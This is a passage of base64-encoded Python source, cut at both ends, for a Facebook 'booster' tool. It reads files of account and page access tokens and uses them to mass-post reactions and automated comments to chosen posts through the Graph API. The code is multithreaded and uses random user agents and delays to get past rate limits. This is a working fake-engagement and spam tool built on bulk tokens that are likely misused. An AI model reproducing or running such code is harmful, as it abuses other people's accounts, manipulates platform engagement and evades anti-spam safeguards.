pbGUgdG8gdXNlCiAgICBmaWxlX29wdGlvbnMgPSB7CiAgICAgICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgICAgIDM6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgIHt3aGl0ZX1DSE9PU0UgVFlQRSBPRiBSRUFDVE9SUzogCiAgICAge2JsdWV9WzFdIHtncmVlbn1GUkEgQUNDT1VOVCAKICAgICB7Ymx1ZX1bMl0ge2dyZWVufUZSQSBQQUdFUwogICAgIHtibHVlfVszXSB7Z3JlZW59UlBXIEFDQ09VTlQKICAgICB7Ymx1ZX1bNF0ge2dyZWVufVJQVyBQQUdFUwogICAgIHtyZWR9WzBdICB7cmVkfSBFWElUIAogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikgICMgRGlzcGxheSBvbmx5IHRoZSBmaWxlbmFtZQogICAgCiAgICB0cnk6CiAgICAgICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUNob29zZTogICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIGZpbGVfY2hvaWNlIG5vdCBpbiBmaWxlX29wdGlvbnM6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbZmlsZV9jaG9pY2VdCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDI6IExvYWQgdGhlIHRva2VucyBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICB0b2tlbnMgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGZpbGUucmVhZGxpbmVzKCkgaWYgbGluZS5zdHJpcCgpXSAgIyBFbnN1cmUgbm8gZW1wdHkgbGluZXMKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludCgiRmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGxvYWRpbmcgdG9rZW5zOiB7ZX0iKQogICAgICAgIHJldHVybgoKICAgIGF2YWlsYWJsZV90b2tlbnMgPSBsZW4odG9rZW5zKQoKICAgICMgU3RlcCAzOiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBzdGFydGluZyBsaW5lCiAgICBpZiBhdmFpbGFibGVfdG9rZW5zID09IDA6CiAgICAgICAgcHJpbnQoIk5vIHRva2VucyBhdmFpbGFibGUgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZS4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHthdmFpbGFibGVfdG9rZW5zfXtyZWR9KTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgc3RhcnRfbGluZSA8IDEgb3Igc3RhcnRfbGluZSA+IGF2YWlsYWJsZV90b2tlbnM6CiAgICAgICAgICAgIHByaW50KGYiUGxlYXNlIGVudGVyIGEgdmFsaWQgbGluZSBudW1iZXIgYmV0d2VlbiAxIGFuZCB7YXZhaWxhYmxlX3Rva2Vuc30uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgdG9rZW5zID0gdG9rZW5zW3N0YXJ0X2xpbmUgLSAxOl0gIAogICAgcHJpbnQoZiIgICAge2dyZWVufUZPUk1BVCB7eWVsbG93fToge3JlZH1odHRwczovL3d3dy5mYWNlYm9vay5jb20vcGhvdG8ucGhwP2ZiaWQ9NTQxMzYxNjkxODA4NjAwIikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgeiA9IGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBwb3N0IGxpbmsgb3IgSUQ6ICIpCiAgICBwb3N0X2lkID0gZ2V0X2NvbWJpbmVkX2RhdGEoeikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgdWlkX3VybCA9IHBvc3RfaWQgIAoKICAgIHByaW50KGYiIiIgICAge3llbGxvd31DaG9vc2UgdGhlIHJlYWN0aW9uIHR5cGU6CiAgICAge2JsdWV9WzFdIHtncmVlbn1MSUtFCiAgICAge2JsdWV9WzJdIHtncmVlbn1MT1ZFCiAgICAge2JsdWV9WzNdIHtncmVlbn1XT1cKICAgICB7Ymx1ZX1bNF0ge2dyZWVufVNBRAogICAgIHtibHVlfVs1XSB7Z3JlZW59QU5HUlkKICAgICB7Ymx1ZX1bNl0ge2dyZWVufUhBSEEKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICAKICAgIHRyeToKICAgICAgICByZWFjdGlvbl9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAgIHtncmVlbn1DaG9vc2U6ICIpKQogICAgICAgIHJlYWN0aW9uX21hcCA9IHsKICAgICAgICAgICAgMTogIkxJS0UiLAogICAgICAgICAgICAyOiAiTE9WRSIsCiAgICAgICAgICAgIDM6ICJXT1ciLAogICAgICAgICAgICA0OiAiU0FEIiwKICAgICAgICAgICAgNTogIkFOR1JZIiwKICAgICAgICAgICAgNjogIkhBSEEiCiAgICAgICAgfQogICAgICAgIHJlYWN0aW9uX3R5cGUgPSByZWFjdGlvbl9tYXAuZ2V0KHJlYWN0aW9uX2Nob2ljZSwgTm9uZSkKICAgICAgICBpZiByZWFjdGlvbl90eXBlIGlzIE5vbmU6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIHJlYWN0aW9uIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIAogICAgdHJ5OgogICAgICAgIG51bV9yZWFjdGlvbnMgPSBpbnQoaW5wdXQoZiIgICAgIHt5ZWxsb3d9RW50ZXIgdGhlIG51bWJlciBvZiByZWFjdGlvbnM6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBmb3IgcmVhY3Rpb25zLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDU6IENoZWNrIGlmIHRoZSByZXF1ZXN0ZWQgbnVtYmVyIG9mIHJlYWN0aW9ucyBleGNlZWRzIHRoZSBhdmFpbGFibGUgdG9rZW5zCiAgICBpZiBudW1fcmVhY3Rpb25zID4gbGVuKHRva2Vucyk6CiAgICAgICAgcHJpbnQoZiJ7cmVkfUVOVEVSIEFHQUlOIE5PVCBleGNlZWRpbmcge2xlbih0b2tlbnMpfSIpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDY6IFBlcmZvcm0gcmVhY3Rpb25zIHVzaW5nIG11bHRpdGhyZWFkaW5nCiAgICByZWFjdGlvbnNfY291bnQgPSAwCiAgICBtYXhfd29ya2VycyA9IDEwICAjIFNldCBtYXhpbXVtIG51bWJlciBvZiB0aHJlYWRzCiAgICByZXN1bHRzID0gW10gIAoKICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPW1heF93b3JrZXJzKSBhcyBleGVjdXRvcjoKICAgICAgICAjIFN1Ym1pdCByZWFjdGlvbnMgZm9yIGVhY2ggdG9rZW4KICAgICAgICBmdXR1cmVfdG9fdG9rZW4gPSB7ZXhlY3V0b3Iuc3VibWl0KHBlcmZvcm1fcmVhY3Rpb24sIHRva2VuLCB1aWRfdXJsLCByZWFjdGlvbl90eXBlKTogdG9rZW4gZm9yIHRva2VuIGluIHRva2Vuc1s6bnVtX3JlYWN0aW9uc119CgogICAgICAgICMgUHJvY2VzcyB0aGUgcmVhY3Rpb25zCiAgICAgICAgd2hpbGUgcmVhY3Rpb25zX2NvdW50IDwgbnVtX3JlYWN0aW9uczoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBhc19jb21wbGV0ZWQoZnV0dXJlX3RvX3Rva2VuKToKICAgICAgICAgICAgICAgIHRva2VuID0gZnV0dXJlX3RvX3Rva2VuW2Z1dHVyZV0KICAgICAgICAgICAgICAgIHVpZCA9IHRva2VuLnNwbGl0KCd8JylbMF0KICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4sIHN0YXR1c19jb2RlLCByZXNwb25zZV90ZXh0ID0gZnV0dXJlLnJlc3VsdCgpCiAgICAgICAgICAgICAgICAgICAgaWYgc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZWFjdGlvbnNfY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgICAge3JlZH1bUkVBQ1RPUl0ge3llbGxvd317dWlkfSAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSAPiB7Z3JlZW59U1VDQ0VTU0ZVTExZIFJFQUNURUQhIikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgIyBJZiB0aGUgZGVzaXJlZCBudW1iZXIgb2Ygc3VjY2Vzc2Z1bCByZWFjdGlvbnMgaXMgYWNoaWV2ZWQsIGJyZWFrIHRoZSBsb29wCiAgICAgICAgICAgICAgICAgICAgaWYgcmVhY3Rpb25zX2NvdW50ID49IG51bV9yZWFjdGlvbnM6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXG57Z3JlZW59U3VjY2Vzc2Z1bGx5IHJlYWNoZWQge3JlYWN0aW9uc19jb3VudH0gcmVhY3Rpb25zISBFeGl0aW5nLi4uIikKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICAjIEV4aXQgdGhlIGZ1bmN0aW9uIGFmdGVyIHJlYWNoaW5nIHRoZSBkZXNpcmVkIGNvdW50CiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJFcnJvciBwcm9jZXNzaW5nIHRva2VuIHt0b2tlbn06IHtlfSIpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIElmIHRoZXJlIGFyZSBzdGlsbCByZW1haW5pbmcgcmVhY3Rpb25zIHRvIHBlcmZvcm0sIHN1Ym1pdCBtb3JlIHRhc2tzIGZyb20gdGhlIHJlbWFpbmluZyB0b2tlbnMKICAgICAgICAgICAgcmVtYWluaW5nX3Rva2VucyA9IHRva2Vuc1tudW1fcmVhY3Rpb25zOiBudW1fcmVhY3Rpb25zICsgNV0gICMgU3VibWl0IDUgbW9yZSB0YXNrcyBhdCBhIHRpbWUgaWYgbmVlZGVkCiAgICAgICAgICAgIGlmIHJlbWFpbmluZ190b2tlbnM6CiAgICAgICAgICAgICAgICBmdXR1cmVfdG9fdG9rZW4gPSB7ZXhlY3V0b3Iuc3VibWl0KHBlcmZvcm1fcmVhY3Rpb24sIHRva2VuLCB1aWRfdXJsLCByZWFjdGlvbl90eXBlKTogdG9rZW4gZm9yIHRva2VuIGluIHJlbWFpbmluZ190b2tlbnN9CiAgICBwcmludChmIntibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiJ7Z3JlZW59VE9UQUw6IHtyZWFjdGlvbnNfY291bnR9IikKCgoKaW1wb3J0IHJhbmRvbQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRpbWUKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciwgYXNfY29tcGxldGVkCgpkZWYgcmVwKHBvc3RfaWQsIGNvbW1lbnQsIGFjY2Vzc190b2tlbik6CiAgICAiIiJDb21tZW50IG9uIGEgRmFjZWJvb2sgcG9zdCB1c2luZyB0aGUgcHJvdmlkZWQgYWNjZXNzIHRva2VuLiIiIgogICAgCiAgICAjIFNwbGl0IHRoZSB0b2tlbiBpbiBjYXNlIGl0IGluY2x1ZGVzICd1aWR8YWNjZXNzX3Rva2VuJyBmb3JtYXQKICAgIGlmICd8JyBpbiBhY2Nlc3NfdG9rZW46CiAgICAgICAgXywgYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2VuLnNwbGl0KCd8JywgMSkKICAgIAogICAgIyBOb3cgY2hlY2sgaWYgdGhlIHRva2VuIHN0YXJ0cyB3aXRoICdFQScgb3IgJ0VBQScKICAgIGlmIG5vdCBhY2Nlc3NfdG9rZW4uc3RhcnRzd2l0aCgoIkVBIiwgIkVBQSIpKToKICAgICAgICByZXR1cm4gZiJJbnZhbGlkIHRva2VuOiB7YWNjZXNzX3Rva2VufSIKICAgIAogICAgdHJ5OgogICAgICAgIGNvbnZlcnRlZF9saW5rID0gcG9zdF9pZAogICAgICAgIGF1dG9fY29tbWVudF91cmwgPSBmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxMy4wL3tjb252ZXJ0ZWRfbGlua30vY29tbWVudHMnCiAgICAgICAgcGFyYW1zID0gewogICAgICAgICAgICAnbWVzc2FnZSc6IGNvbW1lbnQsCiAgICAgICAgICAgICdhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4KICAgICAgICB9CiAgICAgICAgdGltZS5zbGVlcCgxKSAgIyBTbGVlcCBmb3IgMSBzZWNvbmQgYmV0d2VlbiBjb21tZW50cwogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICd1c2VyLWFnZW50JzogV191ZXJhZ250KCkgICMgVXNlIHRoZSByYW5kb20gdXNlciBhZ2VudAogICAgICAgIH0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoYXV0b19jb21tZW50X3VybCwgcGFyYW1zPXBhcmFtcywgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIAogICAgICAgICMgUHJpbnQgc3RhdHVzIGNvZGUgYW5kIHJlc3BvbnNlIGZvciBkZWJ1Z2dpbmcKCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICByZXR1cm4gZiJcMDMzWzE7MzFtW1NVQ0NFU1NdXDAzM1sxOzMxbSBcMDMzWzE7MzJtU1VDQ0VTU0ZVTExZIENPTU1FTlRFRDoge2dyZWVufXtjb21tZW50fVwwMzNbMTszMm0iCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIGYiXDAzM1sxOzMxbVtGQUlMRURdXDAzM1sxOzMxbSBGQUlMRUQgVE8gQ09NTUVOVDoge2dyZWVufXtjb21tZW50fSAiCgogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBmIlJlcXVlc3QgZmFpbGVkOiB7c3RyKGUpfSIKCgpkZWYgcmVwbHkoKToKICAgICIiIlBlcmZvcm0gY29tbWVudHMgYmFzZWQgb24gdXNlciBpbnB1dCBmb3IgZmlsZSBjaG9pY2UsIHN0YXJ0aW5nIGxpbmUsIHBvc3QgbGluaywgYW5kIG51bWJlciBvZiBjb21tZW50cy4iIiIKICAgIAogICAgIyBTdGVwIDE6IEFzayB0aGUgdXNlciB3aGljaCBmaWxlIHRvIHVzZQogICAgZmlsZV9vcHRpb25zID0gewogICAgICAgIDE6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQiLAogICAgICAgIDI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBUEFHRVMudHh0IiwKICAgICAgICAzOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgICAgICA0OiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV1BBR0VTLnR4dCIKICAgIH0KICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICB7d2hpdGV9Q0hPT1NFIFRZUEUgT0YgUkVBQ1RPUlM6IAogICAgIHt5ZWxsb3d9WzFdIHtncmVlbn1GUkEgQUNDT1VOVCAKICAgICB7eWVsbG93fVsyXSB7Z3JlZW59RlJBIFBBR0VTCiAgICAge3llbGxvd31bM10ge2dyZWVufVJQVyBBQ0NPVU5UCiAgICAge3llbGxvd31bNF0ge2dyZWVufVJQVyBQQUdFUwogICAgIHtyZWR9WzBdIHtyZWR9RVhJVCAKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICAKICAgIHRyeToKICAgICAgICBmaWxlX2Nob2ljZSA9IGludChpbnB1dChmIiAgICAge2dyZWVufUNob29zZTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgZmlsZV9jaG9pY2Ugbm90IGluIGZpbGVfb3B0aW9uczoKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGZpbGVfcGF0aCA9IGZpbGVfb3B0aW9uc1tmaWxlX2Nob2ljZV0KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgMjogTG9hZCB0aGUgdG9rZW5zIGZyb20gdGhlIHNlbGVjdGVkIGZpbGUKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHRva2VucyA9IFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gZmlsZS5yZWFkbGluZXMoKSBpZiBsaW5lLnN0cmlwKCldICAjIEVuc3VyZSBubyBlbXB0eSBsaW5lcwogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCJGaWxlIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgbG9hZGluZyB0b2tlbnM6IHtlfSIpCiAgICAgICAgcmV0dXJuCgogICAgYXZhaWxhYmxlX3Rva2VucyA9IGxlbih0b2tlbnMpCgogICAgIyBTdGVwIDM6IEFzayB0aGUgdXNlciBmb3IgdGhlIHN0YXJ0aW5nIGxpbmUKICAgIGlmIGF2YWlsYWJsZV90b2tlbnMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGF2YWlsYWJsZSBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHN0YXJ0X2xpbmUgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUVudGVyIHRoZSBzdGFydGluZyBsaW5lIHtyZWR9KDEgdG8ge2F2YWlsYWJsZV90b2tlbnN9KTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgc3RhcnRfbGluZSA8IDEgb3Igc3RhcnRfbGluZSA+IGF2YWlsYWJsZV90b2tlbnM6CiAgICAgICAgICAgIHByaW50KGYiUGxlYXNlIGVudGVyIGEgdmFsaWQgbGluZSBudW1iZXIgYmV0d2VlbiAxIGFuZCB7YXZhaWxhYmxlX3Rva2Vuc30uIikKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIHRva2VucyA9IHRva2Vuc1tzdGFydF9saW5lIC0gMTpdICAjIFVzZSB0b2tlbnMgc3RhcnRpbmcgZnJvbSB0aGUgZ2l2ZW4gbGluZQogICAgCiAgICAjIFN0ZXAgNDogQXNrIGZvciB0aGUgcG9zdCBJRAogICAgYSA9IGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgcG9zdCBJRDogIikKICAgIGIgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgdGhlIGNvbW1lbnQgSUQ6ICIpCiAgICByZXN1bHQgPSBmInthfV97Yn0iCgogICAgcG9zdF9pZCA9IHJlc3VsdAogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4p